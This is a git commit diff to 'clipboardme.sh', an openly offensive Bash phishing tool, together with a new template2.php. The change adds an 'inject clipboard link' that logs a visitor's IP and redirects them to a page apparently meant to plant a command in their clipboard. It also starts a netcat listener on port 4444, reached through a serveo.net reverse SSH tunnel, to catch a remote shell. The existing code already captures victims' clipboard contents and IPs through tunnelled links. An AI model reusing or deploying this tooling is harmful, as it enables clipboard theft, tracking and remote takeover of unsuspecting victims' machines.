0f1ad4b9459b8dc249c13598cb615c9da807c9c5
The Linux Choice <34893261+thelinuxchoice@users.noreply.github.com>
2019-04-22 12:24:25 -0300

    Add files via upload

--- clipboardme.sh
+++ clipboardme.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-# Clipboard me v1.0
+# Clipboard me v1.1
 # coded by: github.com/thelinuxchoice/clipboardme
 # If you use any part from this code, giving me the credits. Read the Lincense!
 
@@ -16,7 +16,7 @@ printf "\e[1;77m| \_____| | | | | | |_) ) |_| ( ( | | |  ( (_| |\e[0m\e[1;92m| |
 printf "\e[1;77m \______)_|_| ||_/|____/ \___/ \_||_|_|   \____|\e[0m\e[1;92m|_|_|_|\____) \e[0m\n"
 printf "\e[1;77m            |_|                                               \e[0m\n"
 
-printf " \e[1;77mv1.0 coded by github.com/thelinuxchoice/clipboardme\e[0m \n"
+printf " \e[1;77mv1.1 coded by github.com/thelinuxchoice/clipboardme\e[0m \n"
 
 printf "\n"
 
@@ -74,10 +74,30 @@ while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the grab clipboard link!\n"
 catch_ip
 rm -rf ip.txt
 fi
+
+if [[ -e "ip2.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the inject clipboard link!\n\e[0m"
+
+
+ip=$(grep -a 'IP:' ip2.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+
+cat ip2.txt >> saved.ip2.txt
+
+printf "\n"
+rm -rf iptracker.log
+
+rm -rf ip2.txt
+printf "\n\e[1;92m[\e[0m+\e[1;92m]\e[0m\e[1;77m Listener Started...\e[0m\n"
+nc -lvp 4444
+fi
+
+
 sleep 0.5
 
 if [[ -e "clipboard.txt" ]]; then
@@ -108,11 +128,11 @@ fi
 
 if [[ $subdomain_resp == true ]]; then
 
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net -R '$ddefault_port1':localhost:4444 2> /dev/null > sendlink ' &
 
 sleep 8
 else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$ddefault_port1':localhost:4444 2> /dev/null > sendlink ' &
 
 sleep 8
 fi
@@ -120,10 +140,9 @@ printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
-
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
-
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Grab clipboard link:\e[0m\e[1;77m %s\n' $send_link
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Inject clipboard link:\e[0m\e[1;77m %s/index1.php\n' $send_link
 
 
 }
@@ -182,7 +201,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Grab clipboard link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
 checkfound
@@ -194,8 +213,8 @@ rm -rf sendlink
 fi
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling)\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (Grab/Inject clipboard link)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok (Only grab clipboard link)\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
@@ -222,7 +241,8 @@ send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
 sed 's+forwarding_link+'$send_link'+g' cliptext.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
-
+sed 's+forwarding_link+'$send_link'+g' template2.php > index1.php
+sed 's+serveo_port+'$ddefault_port1'+g' copy.html > index1.html
 
 }
 
@@ -230,6 +250,11 @@ start() {
 
 default_choose_sub="Y"
 default_subdomain="clipboardme$RANDOM"
+default_port1=$RANDOM
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Serveo (Forwarding) Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_port1
+read ddefault_port1
+ddefault_port1="${ddefault_port1:-${default_port1}}"
+
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
 choose_sub="${choose_sub:-${default_choose_sub}}"
@@ -245,6 +270,9 @@ payload
 checkfound
 
 }
+
+
+
 banner
 dependencies
 start1
---
+++ template2.php
@@ -0,0 +1,5 @@
+<?php
+include 'ip2.php';
+header('Location: forwarding_link/index1.html');
+exit
+?>
